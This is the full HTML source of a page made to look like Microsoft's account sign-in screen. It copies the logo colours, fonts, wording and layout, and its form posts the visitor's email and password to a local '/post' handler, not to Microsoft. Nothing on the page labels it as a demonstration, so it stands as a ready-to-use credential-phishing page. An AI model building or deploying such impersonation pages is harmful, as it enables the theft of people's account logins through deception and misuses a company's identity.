<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to your Microsoft account</title>
<style>
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.container{width:90%;max-width:440px;padding:44px;text-align:center}
.logo{width:108px;height:24px;margin:0 auto 20px;background:#f25022;background:linear-gradient(90deg,#f25022 25%,#7fba00 25%,#7fba00 50%,#00a4ef 50%,#00a4ef 75%,#ffb900 75%);border-radius:2px}
h1{font-size:24px;font-weight:600;margin:0 0 12px;color:#1b1b1b}
.subtitle{color:#605e5c;font-size:15px;margin-bottom:24px}
input{width:100%;padding:8px 12px;margin:8px 0;border:1px solid #8a8886;background:#fff;box-sizing:border-box;font-size:15px}
input:focus{outline:none;border:2px solid #0078d4}
button{width:100%;padding:10px;margin:16px 0 8px;background:#0078d4;color:white;border:none;cursor:pointer;font-size:15px;font-weight:600}
button:hover{background:#106ebe}
.link{text-align:center;margin-top:16px}
a{color:#0067b8;text-decoration:none;font-size:13px}
a:hover{text-decoration:underline}
</style>
</head>
<body>
<div class="container">
<div class="logo"></div>
<h1>Sign in</h1>
<div class="subtitle">to continue to Microsoft</div>
<form action="/post" method="POST">
<input type="email" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="link">
<a href="/">Create a Microsoft account</a>
</div>
</div>
</body>
</html>
